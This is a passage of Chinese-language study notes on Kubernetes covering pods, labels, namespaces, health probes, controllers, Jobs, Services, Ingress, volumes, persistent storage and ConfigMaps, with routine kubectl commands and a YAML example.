中使用多个容器？仅当其他容器是做为主容器的辅助身份出现时，例如提供日志转换器和收集器、数据处理器、通信适配器等； 做决定前待思考的问题 它们需要一起运行，还是可以在不同的主机上运行？ 它们代表的是一个整体，还是相互独立的组件？ 它们必须一起进行扩缩容还是可以分别进行？ 以 YAML 或 JSON 描述文件创建 podYAML 的基本结构组成 版本 类型 元信息 规格 在 pod 定义中指定端口仅起到展示性的作用，以便让看到这个文件的人知道当前 pod 有哪些端口可以被访问，即使不写，也仍然可以访问；另外一个好处是可以给该端口指定名称，这样使用起来将更加方便； 常用命令kubectl get pod -o yaml查看容器的描述，支持 yaml 和 json 两种格式 kubectl create -f 按 yaml 文件创建相应的资源； 好奇 create 和 apply 有什么区别？答：使用 apply 创建的资源，后果可以再次使用 apply 来检查声明文件是否存在更新，如果有更新，会自动删除旧资源，并创建新资源； kubectl logs 查看 pod 的日志； 当日志文件达到 10MB 大小时，日志会自动轮替； kubectl logs -c 获取 pod 中某个容器的日志； 默认情况下，日志的生命周期和 pod 绑定，即 pod 删除后，日志也消失了；如果想保留日志，则需要另外建立一个中心化的日志系统来存储日志； 向 pod 发送请求kubectl port-forwad kubia-manual 8888:8080在不使用 service 的情况下，port-forwad 可将本地端口转发到 pod 中的某个端口 使用标签组织 pod标签不仅可以用来组织 pod，也可以用来组织其他的 kubernetes 资源； 创建资源时，可以附加标签；创建之后，仍然可以添加标签或修改标签； 通过标签，可以非常方便的对资源进行分类管理；也可以实现批量化操作； 添加或修改标签kubectl label po &#x3D;新增标签 kubectl label po &#x3D; –overwrite通过 –overwrite 选项更改旧标签 通过标签选择器列出 pod 子集标签选择器的选择条件 包含（或不包含）特定键； 包含特定的键值对； 包含特定键，但值不同； 标签选择器支持多个条件，此时需要满足全部条件才算匹配成功； 使用标签和选择器来约束 pod 调度当节点是同质的时候，无须显式的声明 pod 应该被调度的位置；但当节点是异质的时候，如果应用程序对硬件有要求，则需要使用需求描述，来告知 kubernetes 对调度的要求（但仍然不是显式指定节点，而是由 kubernetes 自行安排），例如设置标签做为过滤的条件 label gpu&#x3D;true； 1234567891011# 示例apiVersion: v1kind: Podmetadata: name: kubia-gpuspec: nodeSelector: gpu: &quot;true&quot; containers: - image: luksa/kubia name: kubia 虽然也可以将 pod 调度到某个确定的节点（通过节点唯一标签实现，即 kubernetes.io&#x2F;hostname），但是这样风险很大，因为有可能该节点刚好处于不可用状态，这样会导致部署不成功；所以，最好的方式是使用标签选择器； 注解 pod注解也是一个类似标签的键值对的形式，但是它不能用于选择器，它的用途在于给对象添加更多说明性的信息，方便其他人了解对象的一些重要信息； 除了手动添加注解后，Kubernetes 本身也会根据需要，自动给对象添加一些注解； 注解信息存储于对象 metadata 下的 annotations 字段中； 添加和修改注解kubectl annotate pod kubia-manual mycompany.com&#x2F;somea nnotation&#x3D;”foo bar”使用“mycompany.com&#x2F;someannotation”这种格式的目的在于尽量减少冲突，避免不小心覆盖的可能性 使用命名空间对资源进行分组通过标签来分组，存在的问题是不同标签之间的对象可能会有重叠，如果想实现不重叠，则可以通过命名空间来进行分组；这样可以解决资源名称冲突、不同用户误删除其他用户资源的问题；同时还可以限制某些用户仅可访问某些资源、限制单个用户可用的计算资源数量等； 命名空间是比资源更高一个层级的抽象，所以对象都默认属于某个命名空间中；如果没有特意指明哪个命名空间，一般是在 default 命名空间中操作对象；命名空间相当于给资源名称提供了一个作用域； 当需要操作某个特定命名空间中的对象时，需要在命令中指定相应的命名空间名称； 创建一个命名空间有两种创建方法： 直接通过 create 命令创建，示例： kubectl create namespace 通过 YAML 描述文件创建； 领悟：在 kubernetes 中，所有东西其实都是对象，都可以使用 YAML 文件来描述对象的一些属性特征，然后通过 create 命令创建该对象； 管理命名空间中的资源当命名空间创建好了以后，如果要将某个对象放入该空间，也有两种方法： 在 create 命令中通过 -n 选项指定空间名，示例：kubectl create -f -n 在 YAML 文件中的 metadata 下的字段 namespace 指定所属的命名空间 在对命名空间中的对象进行增删改查操作时，需要指定相应的命名空间名称，否则将默认操作当前上下文命名空间中的资源（默认是 default ，但可以通过 kubectl config 对当前上下文进行修改）； 注：命名空间仅仅是一种逻辑上的资源分组，它并不提供资源之间的物理隔离，因此不同命名空间的对象之间，如果知道对方的 IP 地址，仍然是可以相互通信的； 停止和移除 pod按名称删除 podkubectl delete po 使用标签选择器删除 podkubectl delete po -l &#x3D;通过删除整个命名空间来删除 podkubectl delete ns 该命名将删除整个命名空间，以及里面的 pod 删除命名空间中的 pod，但保留命名空间kubectl delete po –all–all 选项确实会删除当前运行中的所有 pod，但问题是如果控制器没有停止运行的话，它将根据描述文件的描述，重新创建 pod 出来； 删除命名空间中的（几乎）所有资源kubectl delete all –all4. 副本机制和其他控制器：部署托管的 podpod 是最小的单元，它需要被部署到节点上，而这意味着当节点失败时，pod 也将被删除；因此需要引入一种机制，当发现节点失败时，会在新节点上面部署 pod，这样才可以确保 pod 随时健康运行；一般通过 ReplicationController 或 Deployment 来实现这一点； 保持 pod 健康应用存在于容器之中，如果是容器挂了，K8s 会重启容器，但如果是应用程序挂了而容器还正常运行时，就需要引入一种监控机制，来重启应用程序了； 介绍存活探针存活探针：liveness probe，用来探测应用程序是否在正常运行中，如果探测失败，就会重启容器； 另外还有一种就绪探针，readiness probe，它适用于不同的场景； 三种类型的探针： HTTP GET 探针：向应用发送 GET 请求，像是否收到正确的响应码； TCP 套接字探针：与容器中的指定端口建立连接，像是否能够连接成功； Exec 探针：在容器内运行指定的命令，看退出状态码是否为 0（表示正常），非零表示失败； 创建基于 HTTP 的存活探针 使用存活探针 logs 命令是查看当前 pod 的日志，如果加上 –previous 选项，则可以查看之前 pod 的日志 当探针检查到容器不健康后，K8s 会删除旧的容器，创建新容器，而不是重启原来的容器； 配置存活探针的附加属性设置首次探测等待时间 如果不设置初始等待时间，则将在启动时马上探测容器，这样通常会导致失败； 创建有效的存活探针存活探针应该检查什么存活探针的作用在于确保应用程序健康工作，因此可以在应用程序中增加一个 API，当正常工作时，访问该 API 可以运行相应的代码，检查各项组件正常工作，之后返回一个正确的代号； 保持探针轻量探针本身是会消耗计算资源的，而且由于它的运行频率也比较高，因此非常有必要保证它是轻量的，一般可以使用 HTTP GET 探针； 无须在探针中实现重试循环虽然探针的失败阈值是可以配置的，但是貌似没有必要； 了解 ReplicationControllerReplicationController 副本管理器；pod 运行在节点中，只有当 pod 被 ReplicationController 管理时，pod 才会在节点故障消失后马上被重建； ReplicationController 通过标签选择器来判断符合条件的 pod 数量是否与预期相符； ReplicationController 的操作ReplicationController 有三个组件，分别是标签选择器、副本数量、pod 模板；当更改副本数量时，会影响现有的 pod；当更改标签选择器和模板时，会使现在的 pod 脱离监控；ReplicationController 将不再关注这些 pod； 创建一个 ReplicationController 如果不指定选择器，则 K8S 会以模板里面的标签自动作为选择器的内容，这样更安全，避免因为不小心写错选择器，导致无休止的一直创建 pod； 使用 ReplicationController查看 rc 的状态 将 pod 移入或移出 ReplicationController 的作用域ReplicationController 与 pod 之间其实没有任何的绑定管理，它们纯粹是通过标签选择器联系在一起的，因此只需要改变 rc 的标签选择器，或者改变 pod 的标签，它们就会建立或者断开联系； 如果改动了 pod 的标签，它与原来的 rc 失去联系，rc 会发现少了一个家伙，之后 rc 会重新创建一个 pod； 如果改动了 rc 的标签选择器，将导致现有的 pod 全部脱离联系，并且会生成三个新的 pod； 修改 pod 模板rc 的 pod 模板也可以被修改，但是修改之后并不会影响当前正在运行的 pod，而只会影响后续新创建出来的 pod；这样方法可以用来升级 pod，但它不是升级 pod 的最好方法； edit 命令会使用默认的编辑器来操作 yaml 文件，可以通过设置 KUBE_EDITOR 环境变量来改变默认编辑器 水平缩放 pod有两种方法可以实现水平缩放，一种是使用 kubectl scale 命令，一种是直接编辑修改 yaml 文件； 删除一个 ReplicationCotroller删除 ReplicationCotroller 时，默认会删除由其监管的 pod，但如果加上 cascade 选项后，就可以仅删除 rc 本身，而不删除 pod； 使用 ReplicaSet 而不是 ReplicationControllerReplicaSet 是新一代的 ReplicationController，用来取代 ReplicationController； 比较 ReplicationController 和 ReplicaSet它们二者基本上完全相同，区别在于 ReplicaSet 里面标签选择器的表达能力更强；例如可以支持：包含、不包含、等于等多种条件表达式； 定义 ReplicaSet 创建和检查 ReplicaSet 使用 ReplicaSet 的更富表达力的标签选择器ReplicaSet 的更富表达力的标签选择器主要由它的 matchExpressions 属性来体现，它由三部分组成，分别是键名、条件运算符、键值（可以是列表）； 条件运算符包括： In：标签值包含在列表中 NotIn：标签值不在列表中 Exists：存在指定的标签（值无所谓）； DoesNotExist：不存在指定的标签（值无所谓）； 使用 DaemonSet 在每个节点上运行一个 pod由 ReplicaSet 管理的 pod 是随机分布在节点上面的，有可能每个节点刚好一个 pod，也有可能不那么平均，有些多点，有些少点；如果想让每个节点刚好运行一个 pod，则需要用到 DaemonSet 来搞定； 一般来说，有这种特殊部署要求的 pod 主要是用来运行一些系统服务进程的； 使用 DaemonSet 在每个节点上运行一个 podDaemonSet 根据选择器选择出匹配的节点后，就会在每个节点上运行一个 pod； 如果节点挂了，则它不会有动作； 但如果添加一个新节点到集群中，则它会马上给这个新节点创建一个 pod； 如果节点上面的 pod 挂了，则它会重新在该节点上面创建一个 pod； 使用 DaemonSet 只在特定的节点上运行 podDaemonSet 通过 pod 模板中的 nodeSelector 来选择匹配的节点； 由于 DaemonSet 是使用标签选择器来匹配节点，因此让节点的标签被修改后不再匹配时，DaemonSet 会帮忙将该节点上面已经创建的 pod 删除掉； 运行执行单个任务的 podReplicationController、ReplicaSet、DaemonSet 创建出来的 pod 都是持续运行的，当需要创建一些只运行一次就退出的 pod 时，这个时候 Job 出场才能搞定了； 介绍 Job 资源Job 很适合去干一些临时任务，尤其是这些临时任务需要在每个节点上面跑一次，而且每次跑的时间比较长，有可能中途出现意外，需要重新再跑的时候；这时用 Job 的优势就体现出来了，因为它可以通过选择器批量在多个节点上面跑任务，然后会持续监控任务顺利完成才罢休，不然会自动重新运行意外退出的任务，直到它成功为止，这样是可以让人很省心的； 定义 Job 资源 Job 的 restartPolicy 只能是 onFailure 或者 Never，不能是通常默认的 Always； 在 Job 运行一个 podJob 管理的 pod 在运行完成后，会变成“已完成”的状态，但不会被删除，因为这样可以查阅日志，如果删除了就没有办法看到运行的日志了； 在 Job 中运行多个 pod 实例Job 可以运行一次创建一个 pod，也可以运行多次，创建多个 pod 实例，这些实例可以并行运行，也可以串行； 限制 Job pod 完成任务的时间有些 pod 有可能运行很久才能结束，但有时候万一卡住了则将永不结束；因此，可以通过设置运行时间的上限来解决这个问题；当超时后，就会 pod 终止，并将 Job 标记为失败； 通过设置 activeDeadlineSeconds 属性来实现； 安排 Job 定期运行或在将来运行一次如果有些任务需要定期重复执行，如果在某个特定的时间点执行，则此时通过通过创建 CronJob 来实现； 创建一个 CronJob 了解计划任务的运行方式设置 pod 的最迟开始时间，如果超过了指定的时间还没有开始运行，则 Job 会被标记为失败； 问题一：如果 CronJob 同时创建了两个任务怎么办？答：执行的任务需要是幂等的，即多次运行仍然会得到相同的结果； 问题二：如果 CronJob 遗漏没有创建任务怎么办？答：当下一个任务开始时，如果发现上一个任务错过了，则应该先完成前面一个任务的工作； 5. 服务：让客户端发现 pod 并与之通信由于 pod 的生命周期是短暂的，因此它的 IP 地址是动态变化的，所以需要有一种机制，能够稳定的连接到提供服务的 pod，这种机制就是服务；服务需要做两个事情，当 pod 就绪后，能够将请求路由给 pod 进行响应；当 pod 变动后，能够发现新 pod 的通信地址； 猜测它的实现机制是让 pod 被创建并进入就绪状态后，就向相关控制器进行报告，相当于在控制器那里做一个登记备案，之后控制器就可以将外部请求路由给它了； 介绍服务概念：服务很像一个有固定 IP 地址的负载均衡器，既能够被内部的 Pod 稳定的访问，也能够被外部稳定的访问，同时能够将外部请求路由给当前正在工作的 Pod； 创建服务与其他资源类似，服务同样是通过标签选择器，来判断当前服务应该路由匹配到哪些 Pod； 通过 kubectl expose 创建服务kubectl expose deployment hello-world –type&#x3D;LoadBalancer –name&#x3D;my-service 通过 YAML 文件创建服务kubectl create kubia-svc.yaml kubia-svc.yaml 检测新的服务kubectl get svc 默认情况下，服务的作用范围在集群内部，让 pod 之间可以通讯； 从内部集群测试服务 此处的双横杠是命令的间隔，以便匹配给 kubectl 的参数和远程要执行的命令 curl 配置服务上的会话亲和性由于负载均衡的存在，一般来说每次服务调用都会随机分配给不同的 pod 进行响应，但是可以通过设置 sessionAffinity 属性来指定倾向性的 pod IP；它会将来源某个特定 ClientIP 的请求都转发到某个特定的 Pod 上面； 同一个服务暴露多个端口 使用命名的端口 使用命名端口的好处是万一端口号改了，也不需要改动调用的地方； 服务发现当服务创建好了后，Kubernetes 会将服务的地址存起来，这样当后续有创建新的 Pod 时，它就会把服务的地址写入新 Pod 的环境变量中，这样新 Pod 就可以通过环境变量来访问服务了； 但是如果 Pod 早于服务之前创建的话，就没有办法使用写入环境变量的方式了； 通过环境变量发现服务 通过 DNS 发现服务当 Kubernetes 启动的时候，它其实会创建一个 Kube-dns 的 Pod，这个 Pod 的功能就是用来做 DNS 的工作的；所有服务都会在那里备案（即添加一个条目），以便其他 Pod 可以通过全限定域名（FQDN）查询到服务； Kubernetes 通过修改 Pod 中的 &#x2F;etc&#x2F;resolv.conf 文件， 强制 Pod 访问其创建的 内部 DNS 服务器（即名为 Kube-dns 的 Pod） ；但是 Pod 可以通过修改 spec 中的 dnsPolicy 属性来绕过它； 通过 FQDN 连接服务 backend-database 表示服务的名称 default 表示命名空间 svc.cluster.local 表示本地集群 虽然服务可以通过名称进行访问，但访问者仍然需要知道服务的端口号，除非服务使用了标准端口号； 如果访问者的 Pod 与提供服务的 Pod 在同一个命名空间和集群，则只需要服务名称就够了； 连接集群外部的服务介绍服务 endpoint直觉上服务和 pod 是直接连接的，但实际上之间隔着 endpoint 资源，服务直接对话的是 endpoint，之后才是 Pod； 手动配置服务的 endpoint服务是通过标签选择器来创建相应数量的 endpoint 资源的，因此，如果服务没有写标签选择器，则 Kubernets 就不会为服务创建 endpoint，但是我们可以通过手动创建的方式，为服务创建相应的 endpoint；服务和 endpoint 需要使用相应的名称，才能建立关联； 此时通过创建外部 IP 地址的 endpoint，就可以实现对外部服务的访问； 为外部服务创建别名 由于 ExternalName 已经提供了外部域名和端口，因此实际内部 Pod 在获得这些信息后，并不需要再走内部的 DNS 服务代理，而是可以直接访问公网的 DNS 服务器，完成对外部服务的访问； 因此 Kubernetes 都不需要为 ExternalName 类型的服务分配内部 IP 地址了； 将服务暴露给外部客户端暴露服务给外部有三种方法： NodePort LoadBalance Ingress 使用 NodePort 类型的服务NodePort 的机制是在所有的节点上预留一个相同的端口，当外部访问该端口时，就将请求转发到内部提供服务的资源（其实它也是一个 Pod）；这意味着不仅可以通过 ClusterIP 访问服务，也可以通过任意节点的公网 IP 访问服务； 虽然 NodePort 服务的好处是访问任意节点的 IP 和相应端口即可以访问服务，但其实这种方式并不好，因为万一节点刚好宕机了，则访问将被拒绝； 通过负载均衡器将服务暴露出来负载均衡器需要集群托管供应商支持才行；如果支持的话，当配置服务的类型为 LoadBalancer 时，Kubernetes 就会调用供应商提供的接口，创建一个负载均衡器服务； 负载均衡器的本质仍然是一个 NodePort 服务，唯一的区别是它由云基础架构的供应商支持并单独部署出来，如果打开防火墙的话，仍然可以像 NodePort 服务那样通过节点的公网 IP 来访问服务； 由于负载均衡器由云基础架构供应商单独提供，这意味着它是在集群外部、独立的；因此它需要将请求先路由到某个 node，再由该 node 将请求转给服务，之后服务再去寻找对应的 pod； 了解外部连接的特性了解并防止不必要的网络跳数正常来说，当外部请求到达节点时，节点会将连接请求转发到内部服务，然后由内部服务转发给任一 Pod，而这个 Pod 有可能在另外一个节点上面，导致出现不必要的跳转，因为本来在当前节点就有 Pod 可以提供服务了； 为了避免这个问题，可以通过设置 externalTrafficPolicy：local 来阻止额外的跳转；但是如果设置了这个属性为 local，则如果当前节点没有可用的 Pod 时，连接不会被转发，而是会被挂起，这就糟糕了；此时需要负载均衡器将连接转到至少有一个可用 pod 的节点上； 另外这个属性还有一个缺点是它会导致负载均衡器的效率变低，因为负载均衡本来是以 Pod 为单位进行均衡的，但是启用这个属性后，就变成以 Node 为单位了； 记住客户端 IP 是不记录的如果外部请求是先到节点，再到服务，则会存在一个问题，即请求中的数据包的源地址将会被节点做 SNAT 转换，这会导致最终提供服务的 Pod 无法看到请求的源地址；如果请求是先到服务，则不存在以上问题； 貌似使用负载均衡器将不可避免会遇到上述的问题？ 通过 Ingress 暴露服务LoadBalance 类型的服务的成本是很高的，因为每个服务都需要有自己的公网 IP；Ingress 即是为了解决这个问题而出现的； 由于 Ingress 是在 HTTP 层工作，因此它还可以提供 cookie 亲和性的功能； 不是每一种 Kubernetes 实现都默认开启支持 Ingress 的，需要提前确认一下功能开启可用； 创建 Ingress 资源使用描述文件创建： 通过 Ingress 访问服务它的工作原理跟 Nginx 几乎是一模一样的，唯一的区别是不需要在 Nginx 配置文件中说明如何转发请求了，而是在 Ingress 的描述文件中说明； 通过相同的 Ingress 暴露多个服务方式一 方式二 配置 Ingress 处理 TLS 传输在 Kubernetes 中创建 secrets 资源，然后在 Ingress 中引用它，就可以实现与客户端的加密传输了； 当增加证书选项后，如果 Ingress 资源已经创建，此时不需要删除重建，只需要再次运行 kubectl apply 命令，即可更新资源； 问：如何给证书添加 secret 以便 ingress 可以引用？ pod 就绪后发出信号pod 的就绪一般需要一点时间，如果 pod 启动后，立刻将请求接入进来，则第一个响应可能花费的时间比较久，因此需要有个机制能够声明自己是否进入就绪状态； 介绍就绪探针每个容器就绪的状态各有不同，因此就绪探针需要开发人员针对每个容器单独设置； 就绪探针的三种类型 Exec 探针：执行某个进程，状态由进程的退出状态码来确定； HTTP GET 探针：发送 HTTP GET 请求，就绪状态由响应码确定； TCP socket 探针：创建一个 TCP 连接，创建成功表示就绪 了解就绪探针的操作一般会设置一段等待的时间，之后再开启就绪探针的探测；如果容器未通过就绪状态的检查，容器不会被终止或者重新启动，但是存活探针就会；这是二者的主要区别； 向 pod 添加就绪探针可以 ReplicationController 描述文件中的模板添加关于探针的描述，示例如下： 了解就绪探针的实际作用 务必定义就绪探针：因为 Pod 的就绪是需要时间的，如果一创建就接入请求，会导致客户端收到错误的响应； 不要将停止 Pod 的操作逻辑放在就绪探针中，这超出了就绪探针的使用范围； 使用 headless 服务来发现独立的 pod在一些特殊的情况下，客户端可能连接到每个 Pod，而不是只连接到其中一个 Pod；此时客户端需要能够获取到所有 Pod 的 IP 地址列表，然后向它们发起请求；此时可以通过向 Kubernetes 中的 DNS 发起服务查询请求，正常情况下，这个请求返回的是服务 的 IP，但是如果配置服务的时候，其 ClusterIP 字段设置为 None，此该查询请求会获得所有的 Pod 的 IP； 创建 Headless 服务将服务的 ClusterIP 字段设置为 None 会使该服务变成一个 headless 服务； 通过 DNS 发现 podKubernetes 没有自带 nslookup 功能，但查询 DNS 需要使用这个功能，因此，可以通过创建一个带此功能的临时 pod 来实现查询（只需选择一个包含该功能的镜像就可以创建相应的 pod 了，使用 kubectl run 命令来创建，而不是使用描述文件）； 发现所有的 pod（包括未就绪的）headless 类型的服务，可以查询到所有 pod，但默认只限为已经准备就绪的，如果想让它返回的结果包含未就绪的，需要在服务的 metadata 中添加一个字段进行描述，示例如下： 貌似这是一个老方案了，最新的版本中据说要使用 publishNotReadyAddress 字段来实现相同的功能； 排除服务故障有时候服务不能正常工作，此时需要进行调试，以排除故障，找出原因；调试的如下： 确保是从集群内部发起的服务连接请求，而不是从集群外部； 不要通过 ping 来尝试连接集群内的服务，因为服务的 IP 是虚拟的； 如果有定义了就绪探针，确保它已经返回成功，因为未就绪的 pod 不会成为服务的组成部分； 可通过 kubectl get endpoints 来确认某个容器是否已经是服务的一部分了； 当尝试通过 FQDN 来访问服务时，可以试一下能够使用服务的集群 IP 来访问； 检查连接是否访问的是服务的公开端口，而不是其映射的目标端口； 尝试直接连接 pod IP，以确认 Pod 已经在正常工作； 如果 Pod IP 不可访问，需要检查一下 Pod 中的应用是否绑定并暴露相应的端口； 6. 卷：将磁盘挂载到容器存储卷的级别低于 pod，它被定义为 pod 的一部分；因此，它不能被单独创建或者删除；当 pod 被销毁时，存储卷也会被销毁；（好奇如何存储全局数据？） 介绍卷卷的应用示例发现跟之前了解的 docker 存储卷的用法并没有区别，卷需要在 pod 文件中定义，而且，还需要在 containers 部分将它们进行挂载； 存储卷的生命周期跟 pod 绑定，但是据说即使在 pod 和存储卷被销毁后，里面的内容仍然存在（好奇如何实现）； 可用的卷类型 emptyDir：用于存储临时数据的简单空目录； hostPath：用于将目录从工作节点的文件系统挂载到 pod 中； gitRepo：用于检出 Git 仓库的内容来初始化的卷；p nfs：挂载到 pod 中的 NFS 共享卷； 云存储：用于挂载云供应商提供的特定存储类型，例如 Google 的 gcePersistentDisk，亚马逊的 awsElastic BlockStore；微软的 azureDisk等； 网络存储：用于挂载其他类型的网络存储，例如 cinder, cephfs, iscsi, flocker, glusterfs 等等； 资源卷：用于将 Kubernetes 中的元数据资源公开给 pod 使用的特殊类型存储卷，例如 configMap, secret, downwardAPI 等； persistentVolumeClaim：使用预置或者动态配置的持久存储类型； 通过卷在容器之间共享数据使用 emptyDir 卷在 pod 的描述文件中使用存储卷 另外，可通过 medium:Memory 将存储卷的介质限定为内存； 使用 Git 仓库作为存储卷gitRepo 本质上也是一个 emptyDir 存储卷，差别在于初始化的时候，会检出代码进行数据填充；但是如果 Git 仓库中的代码出现更新时，存储卷并不会跟着更新，此时如果删除旧 pod，重新创建新 pod 时就会拉取最新的代码； 保持代码和仓库同步的办法，可以在 pod 中增加一个 git sync 镜像（这类型的镜像有很多），存储卷同时也挂载到基于该镜像所创建的容器（这类容器称为 sidecar 容器）中，然后配置 Github 的 Webhook 进行访问即可； gitRepo 卷有一个缺点，它不能拉取私有的仓库；如果需要拉取私有仓库，则只能使用 sidecar 容器了； 访问工作节点文件系统上的文件由于 pod 跟 Node 是解耦的，因此 pod 理论上不应该使用 node 文件系统中的数据，但存在一些例外情况；当 pod 需要根据 node 的配置文件，对 node 做一些管理工作时，就需要去读取 node 上的文件（这种类型的 pod 一般由 DaemonSet 来管理）； hostPath 卷hostPath 卷指向节点上的某个特定文件或者目录；同一个节点上的多个 pod，如果都有挂载相同路径的 hostPath 卷，则会实现文件的共享； hostPath 卷可以实现一定程度的持久性，即当一个 pod 被删除后，后续在同一个节点上建立的 pod 仍然可以使用上一个 pod 的遗留数据；但是这些数据无法在不同节点之间同步，所以它并不是一个适用于放置数据库文件的方案； 使用 hostPath 卷的 pod貌似 hostPath 卷挺适合用来访问节点上的日志文件或者 CA 证书； 使用持久化存储当数据需要在不同节点的 pod 之间共享时，此时需要使用某种类型的网络存储，pod 通过访问网络存储（NAS）进行数据的读取和写入； 使用 GCE 持久磁盘作为 pod 存储卷步骤 先创建 GCE 持久磁盘：将持久磁盘创建在相同区域的 Kubernetes 集群中； 创建一个使用持久磁盘卷的 pod； 通过底层持久化存储使用其他类型的卷方法大同小异，都是先准备好持久性的存储资源，然后在 pod 描述文件中进行配置以连接它们进行使用； 但是这种方法有很大的缺点，即开发人员需要了解这些持久性存储资源，并且描述文件和它们强耦合，如果换了一个集群环境，描述文件将不再可用，这不是一种最佳实践，有待改进； 从底层存储技术解耦 pod介绍持久卷和持久卷声明持久卷 persistent volume（PV）是一种资源，就像 service&#x2F;pod 一样，它由集群的硬件管理员通过声明来创建；之后开发人员通过持久卷（使用）声明 persistent volume claim (PVC) 来绑定它，然后再通过 pod 声明来来引用相应的持久卷声明； 在同一个时间点，持久卷只能被声明并创建一次，即在它没有被删除前，不能在集群中声明相同名称的另外一个持久卷，除非先把原来旧的删掉； 创建持久卷集群硬件管理员通过声明挂载网络存储来生成持久卷 注：持久卷是全局资源，即它不属于任何单独的命名空间，就像节点一样；但是持久卷的使用声明是归属于特定命名空间的； 通过创建持久卷声明来获取持久卷开发人员在 pod 中引用持久卷之前，需要先创建持久卷声明，绑定某个持久卷，之后才能在 pod 中进行引用该持久卷声明； 在 pod 中使用持久卷声明在创建了持久卷声明后，接下来可以在 pod 声明中引用该持久卷声明； 了解使用持久卷和持久卷声明的好处通过增加了两层抽象，让开发人员和硬件管理员之间的工作实现了解耦，并增加了代码的可移植性，无须更改代码即可在不同的集群之间进行部署； 硬件管理员负责写创建声明创建持久卷，开发人员负责写使用声明绑定和引用持久卷； 持久卷有多种读写模式，例如 RWO, ROX, RWX，它们限定的单位是工作节点 node，而不是 pod 回收持久卷当删除了持久卷声明后，如果之前绑定的持久卷的 reclaim policy 为 retain，则此时该持久卷仍然处于不可用的状态，因为里面存放着上一个 pod 的数据，为了确保数据安全，此时需要手工回收持久卷（即删除并重新创建持久卷资源）； reclaim polic 还有另外两个选项： recycle：删除卷中的内容，并可被绑定到新的声明； delete：删除底层存储； 并不是每一种云存储都同时全部三个选项的，不同的云存储的支持情况不同；持久卷的回收策略，在持久卷创建之后，仍然是可以变更的； 持久卷的动态卷配置集群管理员除了通过手工的方式来创建一个特定技术或平台的存储卷以外，还可以使用动态配置来自动化执行这个任务； Kubernetes 内置了主流云服务提供商的 provisioner 脚本，通过调用脚本，可以实现自动化的资源申请； 动态配置的工作原理是集群管理员声明一个或多个的存储类 storageClass，然后开发人员在引用的时候，在声明中指定需要使用的类即可； 通过 StorageClass 资源定义可用存储类型 在 provisioner 属性中指定了使用哪个云服务供应商的脚本创建存储资源； 请求持久卷声明中的存储类在集群管理员创建了 storageClass 资源后，接下开发人员就可以在 PVC 中进行引用； StorageClass 是通过名称进行引用的，这意味着 PVC 的描述文件是可以在不同的集群中移植的； 不指定存储类的动态配置Kubernetes 自带一个默认的存储类，当开发人员在 PVC 中没有显示指定要引用的存储类时，将会默认使用自带的存储类；因此，如果想要让 Kubernetes 将 PVC 绑定到预先创建的 PV 时，需要将 storangeClasName 设置为空字符串，不然它会调用默认的云服务资源置备脚本自动创建新的存储卷； 因此，设置持久化存储的最简单办法 是创建 PVC 资源就好，至于 PV 此时可以由默认的置备脚本自行创建； 7 ConfigMap 和 Secret: 配置应用程序配置容器内应用程序常见的传递配置参数的做法： 传递命令行参数：参数少的时候； 引用配置文件：参数多的时候，运行容器前将配置文件挂载到卷中； 设置环境变量 敏感配置数据应区别对待，在 Kubernetes 中一般使用 configMap 保存非敏感配置项，用 secret 保存敏感配置项； 向容器传递命令行参数在 Docker 中定义命令与参数 ENTRYPOINT 负责定义启动时要调用的命令； CMD 负责定义传递给 ENTRYPOINT 的参数； RUN 附加参数（会覆盖 CMD 的参数设置，如有）； 虽然也可以使用 CMD 将要执行的命令传递给容器，而不使用 ENTRYPOINT，但这样不太好，因为设置了 ENTRYPOINT 后，即使没有 CMD 选项，容器也依然能够正常运行；因此，CMD 最好只用来传递参数即可； 指令可以有两种格式，分别是： shell 格式：例如 node app.js，该格式将使得 node 进程在 shell 运行； exec 格式：例如 [“node”, “app.js”]，该格式将直接运行 node 进程，不在 shell 中运行； 在 Kubernetes 中覆盖命令和参数镜像中的 ENTRYPOINT 和 CMD 都可以被运行时的命令行参数 command 和 args 覆盖； 为容器设置环境变量在容器定义中指定环境变量 在环境变量值中引用其他环境变量 了解硬编码环境变量的不足之处环境变量如果硬编码在 pod 和容器定义中，意味着需要区别生产容器和非生产容器，这将增加很多管理负担；如果能够将配置参数从 pod 定义中解耦脱离出来的话，将使得 pod 本币的定义更加纯粹； 利用 ConfigMap 解耦配置ConfigMap 介绍为了解决前面遇到的配置项耦合问题，Kubernetes 提供了 ConfigMap 资源来单独管理配置项；它本质上只是简单的键值对映射，值可以是字面量，也可以是文件； ConfigMap 是一种资源，它并不是直接传递给容器，而是通过卷或者环境变量的形式，传递到容器中；因此， 容器中的应用仍然像传统方式一样读取环境变量或者文件来做出不同的行为，这样可以让应用保持对 Kubernetes 的无感知（最佳实践，有利于移植）； 创建 ConfigMap有四种方法创建 ConfigMap： 可以直接在命令行中写字面量； 通过描述文件来创建 .yaml 通过导入文件来创建 –from-file 通过导入文件夹来创建 给容器传递 ConfigMap条目作为环境变量 如果某个容器所引用的 ConfigMap 资源不存在时，该容器将无法正常创建，会处于挂起状态，需要一直等到 ConfigMap 可用以后，容器才会被创建；除非将 ConfigMap 的引用备注为 optional，则此时虽然没有 ConfigMap，容器也会正常启动； 使用 ConfigMap 的好处在于将所有的配置参数作为全局资源进行管理，而不是分散在各个单独的资源描述文件中； 一次性传递 ConfigMap 的所有条目作为环境变量 若 ConfigMap 中存在不合格的键名，在创建的时候将被忽略； 传递 ConfigMap 条目作为命令行参数ConfigMap 并不能直接传递命令行参数，但是可以曲线救国，即通过设置环境变量，然后在命令行参数中引用环境变量就可以了； 使用 ConfigMap 卷将条目暴露为文件存储卷有一种特殊的类型是 ConfigMap 卷，在创建了以文件作为条目的 ConfigMap 后，在声明存储卷时，可以引用该 ConfigMap，这样 ConfigMap 中的文件条目将被存储到卷中，然后我们可以在 Pod 的描述中引用该存储卷即可； 在描述文件中引用 另外还可以只暴露部分条目到卷中 默认情况下，挂载卷到容器中的某个文件夹时，该文件夹中原本的内容将全部被隐藏覆盖；但是可以通过 subpath 字段来避免覆盖原来的文件；此时 mountPath 的值是一个文件名，而不是文件夹，subPath 则是卷中的一个条目，而不是整个卷； 当设置 ConfigMap 作为存储卷的内容来源时，还可以同时设置这些内容的读写权限 更新应用配置且不重启应用程序使用环境变量或者命令行参数给容器传递配置信息的缺点当配置信息出现变更时，无法动态将变更后的数据传递给容器；但是如果使用 configMap 卷就可以，不过此时还是需要容器内的应用有监控文件变化并自动重新加载才行； 对于挂载到容器中的卷，如果卷中的文件发生了变化，它在容器中的内容也是实时变化的，但是容器中的应用程序并不一定会监控变化并重新加载；但是如果有重新加载的话，则变化将实时的体现出来； 